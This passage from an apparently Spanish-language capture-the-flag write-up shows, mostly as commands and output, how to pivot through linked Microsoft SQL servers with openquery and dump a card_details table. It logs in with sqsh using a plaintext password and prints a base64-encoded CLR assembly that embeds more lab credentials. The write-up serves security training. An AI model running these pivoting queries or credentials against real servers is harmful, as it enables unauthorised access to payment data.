Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WEB\WEBDB): Line 1: Changed database context to 'master'.
[*] INFO(WEB\WEBDB): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 822) 
[!] Press help for extra shell commands
SQL&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Mirando las <code class="language-plaintext highlighter-rouge">bases de datos</code> la mas interesante parece ser la db <code class="language-plaintext highlighter-rouge">webapp</code> pero no tenemos acceso a ella asi que poco podemos hacer con esta sesión de <code class="language-plaintext highlighter-rouge">mssql</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">SQL&gt; select name from sysdatabases;  

name
------

master
tempdb
model
msdb
webapp

SQL&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Si miramos el nombre del <code class="language-plaintext highlighter-rouge">servidor</code> actualmente en uso es el servidor <code class="language-plaintext highlighter-rouge">WEBDB</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">SQL&gt; select @@servername;

---------

WEB\WEBDB

SQL&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo este <code class="language-plaintext highlighter-rouge">servidor</code> no es el unico, listando todos encontramos <code class="language-plaintext highlighter-rouge">CLIENTS</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">SQL&gt; select srvname from sysservers;  

srvname
-----------

WEB\CLIENTS
WEB\WEBDB

SQL&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">openquery</code> podemos ejecutar las <code class="language-plaintext highlighter-rouge">querys</code> desde el servidor <code class="language-plaintext highlighter-rouge">CLIENTS</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">SQL&gt; select * from openquery([web\clients], 'select @@servername;');  

-----------
WEB\CLIENTS

SQL&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Al listar las <code class="language-plaintext highlighter-rouge">bases de datos</code> desde este <code class="language-plaintext highlighter-rouge">servidor</code> podemos ver una nueva que no podiamos ver antes, el nombre de la db es <code class="language-plaintext highlighter-rouge">clients</code> a la cual si que tenemos acceso</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">SQL&gt; select * from openquery([web\clients], 'select name from sysdatabases;');  

name
-------
master
tempdb
model
msdb
clients

SQL&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Listando los <code class="language-plaintext highlighter-rouge">objetos</code> de la base de datos <code class="language-plaintext highlighter-rouge">clients</code> vemos la tabla <code class="language-plaintext highlighter-rouge">card_details</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">SQL&gt; select * from openquery([web\clients], 'select name from clients.sys.objects;');  

name
----------------------------

BackupClients
card_details
QueryNotificationErrorsQueue
queue_messages_1977058079
EventNotificationErrorsQueue
queue_messages_2009058193
ServiceBrokerQueue
queue_messages_2041058307

SQL&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">La tabla <code class="language-plaintext highlighter-rouge">card_details</code> tiene demasiada informacion asi que nos conectamos con <code class="language-plaintext highlighter-rouge">sqsh</code> y si en el output grepeamos por la cadena <code class="language-plaintext highlighter-rouge">CONTEXT</code> podemos ver la flag</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sqsh</span><span class="p"> -S 10.13.37.12:1433 -U </span><span class="am">'teignton\karl.memaybe'</span><span class="p"> -P </span><span class="am">'B6rQx_d&amp;RVqvcv2A'</span><span class="p">
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'

1&gt; select * from openquery([web\clients], 'select * from clients.dbo.card_details;');  
2&gt; go | grep CONTEXT
CONTEXT{g1mm2_g1mm3_g1mm4_y0ur_cr3d1t}
1&gt;</span>
</code></pre></div></div><br>

</section>

<section class="post" id="flag6">
<br><h3 class="post-title">It's not a backdoor, it's a feature</h3>
<h4 class="post-title">CONTEXT{l0l_s0c3ts_4re_fun}</h4><br>

<p class="plain-text">Además de eso en la base de datos <code class="language-plaintext highlighter-rouge">clients</code> tambien encontramos algunos archivos en <code class="language-plaintext highlighter-rouge">assembly_files</code>, para poder tener todo su contenido lo pasaremos a <code class="language-plaintext highlighter-rouge">base64</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">SQL&gt; select cast (N'' as xml).value('xs:base64Binary(sql:column("content"))','varchar(max)') as data from openquery([web\clients], 'select * from clients.sys.assembly_files;') order by content desc offset 1 rows;

data                                                                                                                                                                                                                                                    
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  

b'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4QMSAw4ADwT5Aw4AMAQdBA4AQgT5Aw4ATQT5Aw4AaQQdBAAAAAABAAAAAAABAAEAAQAQABUAAAAFAAEAAQAJABAAJwAAAAUAAgAHAAEBAAAzAAAADQAKAAgAAQEAAEEAAAANABAACAABAQAATgAAAA0AFQAIAAEAEABiAAAABQAiAAgAAQCbAAoABgAFAS0ABgBBADEABgALATUABgAXATkABgAdAQoABgAnAQoABgAyAQoABgA6AQoABgZDATkAVoBLAS0AVoBVAS0AVoBjAS0AVoBuAS0AVoB1AS0ABgZDATkAVoB9ATEAVoCBATEAVoCGATEAVoCMATEABgZDATkAVoCVATUAVoCdATUAVoCkATUAVoCrATUAVoCxATUAVoC2ATUAVoC8ATUAVoDEATUAVoDJATUAVoDUATUAVoDeATUAVoDjATUAUCAAAAAAhhjFAA0AAQDUIAAAAADEAMsAFAADAAghAAAAAOYB1AAUAAMAGiEAAAAAxAHUABgAAwAAAAAAgACRINwAHQAEAAAAAACAAJEg7wAmAAgAKyEAAAAAhhjFABQACwA0IQAAAACWAPABeAALANwhAAAAAJYAGAJ8AAsA1CMAAAAAhhjFABQACwAAAAEAJQIAAAIAMQIAAAEAPQIAAAEARwIAAAIAUwIAAAMAXAIAAAQAZQIAAAEAawIAAAIAZQIAAAMAcAICAAkAMQDFAIEAOQDFABQACQDFABQAIQDbAoYAIQDoAoYAQQD7AoYASQALA4oAUQDFAJAACQDLABQAWQArA58AYQDFAKQAaQDFAKkAeQDFABQAIQDFAK8AgQDFAKQACQD7AoYAiQDsA6QAEQDUABQAKQDFABQAKQDyA8QAkQDFAKQAmQA9BBQAoQDFAMoAoQBbBNEAsQB2BNYAsQCCBNoAsQCMBNYACAAsADwACAAwAEEACAA0AEYACAA4AEsACAA8AFAACABEAFUACABIADwACABMAEEACABQAFoACABYAFUACABcADwACABgAEEACABkAEYACABoAEsACABsAFAACABwAF8ACAB0AGQACAB4AFoACAB8AGkACACAAG4ACACEAHMALgALAPkALgATAAIBAAFrADwAlgC2AN8AbgMAAQsA3AABAAABDQDvAAEABIAAAAAAAAAAAAAAAAAAAAAA1AIAAAQAAAAAAAAAAAAAAAEAcwAAAAAABAAAAAAAAAAAAAAAAQB8AAAAAAAEAAAAAAAAAAAAAAABAJcDAAAAAAAAADxNb2R1bGU+AHN0b3JlZC5kbGwATmV0d29ya0Nvbm5lY3Rpb24ATmV0UmVzb3VyY2UAUmVzb3VyY2VTY29wZQBSZXNvdXJjZVR5cGUAUmVzb3VyY2VEaXNwbGF5dHlwZQBTdG9yZWRQcm9jZWR1cmVzAG1zY29ybGliAFN5c3RlbQBPYmplY3QASURpc3Bvc2FibGUARW51bQBfbmV0d29ya05hbWUAU3lzdGVtLk5ldABOZXR3b3JrQ3JlZGVudGlhbAAuY3RvcgBGaW5hbGl6ZQBEaXNwb3NlAFdOZXRBZGRDb25uZWN0aW9uMgBXTmV0Q2FuY2VsQ29ubmVjdGlvbjIAU2NvcGUARGlzcGxheVR5cGUAVXNhZ2UATG9jYWxOYW1lAFJlbW90ZU5hbWUAQ29tbWVudABQcm92aWRlcgB2YWx1ZV9fAENvbm5lY3RlZABHbG9iYWxOZXR3b3JrAFJlbWVtYmVyZWQAUmVjZW50AENvbnRleHQAQW55AERpc2sAUHJpbnQAUmVzZXJ2ZWQAR2VuZXJpYwBEb21haW4AU2VydmVyAFNoYXJlAEZpbGUAR3JvdXAATmV0d29yawBSb290AFNoYXJlYWRtaW4ARGlyZWN0b3J5AFRyZWUATmRzY29udGFpbmVyAEJhY2t1cENsaWVudHMAU3lzdGVtLlRleHQAU3RyaW5nQnVpbGRlcgBHZW5lcmF0ZUhUTUwAbmV0d29ya05hbWUAY3JlZGVudGlhbHMAZGlzcG9zaW5nAG5ldFJlc291cmNlAHBhc3N3b3JkAHVzZXJuYW1lAGZsYWdzAG5hbWUAZm9yY2UAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAHN0b3JlZABnZXRfUGFzc3dvcmQAZ2V0X1VzZXJOYW1lAEludDMyAFRvU3RyaW5nAFN0cmluZwBDb25jYXQAU3lzdGVtLklPAElPRXhjZXB0aW9uAEdDAFN1cHByZXNzRmluYWxpemUAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAERsbEltcG9ydEF0dHJpYnV0ZQBtcHIuZGxsAFN0cnVjdExheW91dEF0dHJpYnV0ZQBMYXlvdXRLaW5kAFN5c3RlbS5EYXRhAE1pY3Jvc29mdC5TcWxTZXJ2ZXIuU2VydmVyAFNxbFByb2NlZHVyZUF0dHJpYnV0ZQBTdHJlYW1Xcml0ZXIAVGV4dFdyaXRlcgBXcml0ZQBBcHBlbmQAU3lzdGVtLkRhdGEuU3FsQ2xpZW50AFNxbENvbm5lY3Rpb24AU3lzdGVtLkRhdGEuQ29tbW9uAERiQ29ubmVjdGlvbgBPcGVuAFNxbENvbW1hbmQAU3FsRGF0YVJlYWRlcgBFeGVjdXRlUmVhZGVyAERiRGF0YVJlYWRlcgBnZXRfSGFzUm93cwBHZXRTdHJpbmcAUmVhZAAAAAAARUUAcgByAG8AcgAgAGMAbwBuAG4AZQBjAHQAaQBuAGcAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHMAaABhAHIAZQA6ACAAABFUAEUASQBHAE4AVABPAE4AABlqAGEAeQAuAHQAZQBpAGcAbgB0AG8AbgAAKUQAMABuAHQATAAwAHMAZQBTAGsAMwBsADMAdABvAG4ASwAzAHkAIQAAG1wAXABXAEUAQgBcAEMAbABpAGUAbgB0AHMAADVcAFwAVwBFAEIAXABDAGwAaQBlAG4AdABzAFwAYwBsAGkAZQBuAHQAcwAuAGgAdABtAGwAAIn3PAAhAEQATwBDAFQAWQBQAEUAIABIAFQATQBMACAAUABVAEIATABJAEMAIAAiAC0ALwAvAFcAMwBDAC8ALwBEAFQARAAgAEgAVABNAEwAIAA0AC4AMAAgAFQAcgBhAG4AcwBpAHQAaQBvAG4AYQBsAC8ALwBFAE4AIgA+AAoACgA8AGgAdABtAGwAPgAKADwAaABlAGEAZAA+AAoACQAKAAkAPABtAGUAdABhACAAaAB0AHQAcAAtAGUAcQB1AGkAdgA9ACIAYwBvAG4AdABlAG4AdAAtAHQAeQBwAGUAIgAgAGMAbwBuAHQAZQBuAHQAPQAiAHQAZQB4AHQALwBoAHQAbQBsADsAIABjAGgAYQByAHMAZQB0AD0AdQB0AGYALQA4ACIALwA+AAoACQA8AHQAaQB0AGwAZQA+ADwALwB0AGkAdABsAGUAPgAKAAkAPABtAGUAdABhACAAbgBhAG0AZQA9ACIAZwBlAG4AZQByAGEAdABvAHIAIgAgAGMAbwBuAHQAZQBuAHQAPQAiAEwAaQBiAHIAZQBPAGYAZgBpAGMAZQAgADYALgAwAC4ANwAuADMAIAAoAEwAaQBuAHUAeAApACIALwA+AAoACQA8AG0AZQB0AGEAIABuAGEAbQBlAD0AIgBjAHIAZQBhAHQAZQBkACIAIABjAG8AbgB0AGUAbgB0AD0AIgAwADAAOgAwADAAOgAwADAAIgAvAD4ACgAJADwAbQBlAHQAYQAgAG4AYQBtAGUAPQAiAGMAaABhAG4AZwBlAGQAYgB5ACIAIABjAG8AbgB0AGUAbgB0AD0AIgBDAG8AbgB0AGUAeAB0ACIALwA+AAoACQA8AG0AZQB0AGEAIABuAGEAbQBlAD0AIgBjAGgAYQBuAGcAZQBkACIAIABjAG8AbgB0AGUAbgB0AD0AIgAyADAAMgAwAC0AMAAxAC0AMQA2AFQAMQAyADoANQA3ADoANAA0ACIALwA+AAoACQA8AG0AZQB0AGEAIABuAGEAbQBlAD0AIgBBAHAAcABWAGUAcgBzAGkAbwBuACIAIABjAG8AbgB0AGUAbgB0AD0AIgAxADYALgAwADMAMAAwACIALwA+AAoACQA8AG0AZQB0AGEAIABuAGEAbQBlAD0AIgBEAG8AYwBTAGUAYwB1AHIAaQB0AHkAIgAgAGMAbwBuAHQAZQBuAHQAPQAiADAAIgAvAD4ACgAJADwAbQBlAHQAYQAgAG4AYQBtAGUAPQAiAEgAeQBwAGUAcgBsAGkAbgBrAHMAQwBoAGEAbgBnAGUAZAAiACAAYwBvAG4AdABlAG4AdAA9ACIAZgBhAGwAcwBlACIALwA+AAoACQA8AG0AZQB0AGEAIABuAGEAbQBlAD0AIgBMAGkAbgBrAHMAVQBwAFQAbwBEAGEAdABlACIAIABjAG8AbgB0AGUAbgB0AD0AIgBmAGEAbABzAGUAIgAvAD4ACgAJADwAbQBlAHQAYQAgAG4AYQBtAGUAPQAiAFMAYwBhAGwAZQBDAHIAbwBwACIAIABjAG8AbgB0AGUAbgB0AD0AIgBmAGEAbABzAGUAIgAvAD4ACgAJADwAbQBlAHQAYQAgAG4AYQBtAGUAPQAiAFMAaABhAHIAZQBEAG8AYwAiACAAYwBvAG4AdABlAG4AdAA9ACIAZgBhAGwAcwBlACIALwA+AAoACQAKAAkAPABzAHQAeQBsAGUAIAB0AHkAcABlAD0AIgB0AGUAeAB0AC8AYwBzAHMAIgA+AAoACQAJAGIAbwBkAHkALABkAGkAdgAsAHQAYQBiAGwAZQAsAHQAaABlAGEAZAAsAHQAYgBvAGQAeQAsAHQAZgBvAG8AdAAsAHQAcgAsAHQAaAAsAHQAZAAsAHAAIAB7ACAAZgBvAG4AdAAtAGYAYQBtAGkAbAB5ADoAIgBBAHIAaQBhAGwAIgA7ACAAZgBvAG4AdAAtAHMAaQB6AGUAOgB4AC0AcwBtAGEAbABsACAAfQAKAAkACQBhAC4AYwBvAG0AbQBlAG4AdAAtAGkAbgBkAGkAYwBhAHQAbwByADoAaABvAHYAZQByACAAKwAgAGMAbwBtAG0AZQBuAHQAIAB7ACAAYgBhAGMAawBnAHIAbwB1AG4AZAA6ACMAZgBmAGQAOwAgAHAAbwBzAGkAdABpAG8AbgA6AGEAYgBzAG8AbAB1AHQAZQA7ACAAZABpAHMAcABsAGEAeQA6AGIAbABvAGMAawA7ACAAYgBvAHIAZABlAHIAOgAxAHAAeAAgAHMAbwBsAGkAZAAgAGIAbABhAGMAawA7ACAAcABhAGQAZABpAG4AZwA6ADAALgA1AGUAbQA7ACAAIAB9ACAACgAJAAkAYQAuAGMAbwBtAG0AZQBuAHQALQBpAG4AZABpAGMAYQB0AG8AcgAgAHsAIABiAGEAYwBrAGcAcgBvAHUAbgBkADoAcgBlAGQAOwAgAGQAaQBzAHAAbABhAHkAOgBpAG4AbABpAG4AZQAtAGIAbABvAGMAawA7ACAAYgBvAHIAZABlAHIAOgAxAHAAeAAgAHMAbwBsAGkAZAAgAGIAbABhAGMAawA7ACAAdwBpAGQAdABoADoAMAAuADUAZQBtADsAIABoAGUAaQBnAGgAdAA6ADAALgA1AGUAbQA7ACAAIAB9ACAACgAJAAkAYwBvAG0AbQBlAG4AdAAgAHsAIABkAGkAcwBwAGwAYQB5ADoAbgBvAG4AZQA7ACAAIAB9ACAACgAJADwALwBzAHQAeQBsAGUAPgAKAAkACgA8AC8AaABlAGEAZAA+AAoACgA8AGIAbwBkAHkAPgAKADwAdABhAGIAbABlACAAYwBlAGwAbABzAHAAYQBjAGkAbgBnAD0AIgAwACIAIABiAG8AcgBkAGUAcgA9ACIAMAAiAD4ACgAJADwAYwBvAGwAZwByAG8AdQBwACAAdwBpAGQAdABoAD0AIgAxADgAMAAiAD4APAAvAGMAbwBsAGcAcgBvAHUAcAA+AAoACQA8AGMAbwBsAGcAcgBvAHUAcAAgAHcAaQBkAHQAaAA9ACIAMgAyADMAIgA+ADwALwBjAG8AbABnAHIAbwB1AHAAPgAKAAkAPABjAG8AbABnAHIAbwB1AHAAIAB3AGkAZAB0AGgAPQAiADIAMAA3ACIAPgA8AC8AYwBvAGwAZwByAG8AdQBwAD4ACgAJADwAYwBvAGwAZwByAG8AdQBwACAAdwBpAGQAdABoAD0AIgA2ADQAMgAiAD4APAAvAGMAbwBsAGcAcgBvAHUAcAA+AAoACQA8AGMAbwBsAGcAcgBvAHUAcAAgAHcAaQBkAHQAaAA9ACIAOQA2ACIAPgA8AC8AYwBvAGwAZwByAG8AdQBwAD4ACgAJADwAdAByAD4AATk8AC8AdABhAGIAbABlAD4ACgA8AC8AYgBvAGQAeQA+AAoACgA8AC8AaAB0AG0AbAA+AAoACQAJAAAJTgBhAG0AZQAAD0MAbwBtAHAAYQBuAHkAAAtFAG0AYQBpAGwAABdDAGEAcgBkACAATgB1AG0AYgBlAHIAABlTAGUAYwB1AHIAaQB0AHkAQwBvAGQAZQAACTwAdAByAD4AAF08AHQAZAAgAGgAZQBpAGcAaAB0AD0AIgAxADcAIgAgAGEAbABpAGcAbgA9ACIAbABlAGYAdAAiACAAdgBhAGwAaQBnAG4APQBiAG8AdAB0AG8AbQA+ADwAYgA+AAATPAAvAGIAPgA8AC8AdABkAD4AAAs8AC8AdAByAD4AAC9jAG8AbgB0AGUAeAB0ACAAYwBvAG4AbgBlAGMAdABpAG8AbgA9AHQAcgB1AGUAADVzAGUAbABlAGMAdAAgACoAIABmAHIAbwBtACAAYwBhAHIAZABfAGQAZQB0AGEAaQBsAHMAAFc8AHQAZAAgAGgAZQBpAGcAaAB0AD0AIgAxADcAIgAgAGEAbABpAGcAbgA9ACIAbABlAGYAdAAiACAAdgBhAGwAaQBnAG4APQBiAG8AdAB0AG8AbQA+AAALPAAvAHQAZAA+AABZrlvbO4TITrsIqJypk/eoAAi3elxWGTTgiQIGDgYgAgEOEhEDIAABBCABAQIIAAQIEgwODggGAAMIDggCAwYREAMGERQDBhEYAgYIBAEAAAAEAgAAAAQDAAAABAQAAAAEBQAAAAQAAAAABAgAAAAEBgAAAAQHAAAABAkAAAAECgAAAAQLAAAAAwAAAQQAABIVBCABAQgDIAAOBQACDg4OBSACAQ4ICAcEEgwIEgwCBAABARwEIAEBDgUgAQEROQYgAwEODg4NBwgODg4SEQ4SQRIIAgUgARIVDgYgAgEOEkkEIAASVQMgAAIEIAEOCBkHDg4OHQ4SFQ4SSRJRElUdDhIVHQ4dDggCCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQAAAHg7AAAAAAAAAAAAAI47AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAOwAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAAEQCAAAAAAAAAAAAAEQCNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsASkAQAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAACAAQAAAQAwADAAMAAwADAANABiADAAAAAsAAIAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAIAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMAAuADAALgAwAC4AMAAAADgACwABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAcwB0AG8AcgBlAGQALgBkAGwAbAAAAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAAEAACwABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABzAHQAbwByAGUAZAAuAGQAbABsAAAAA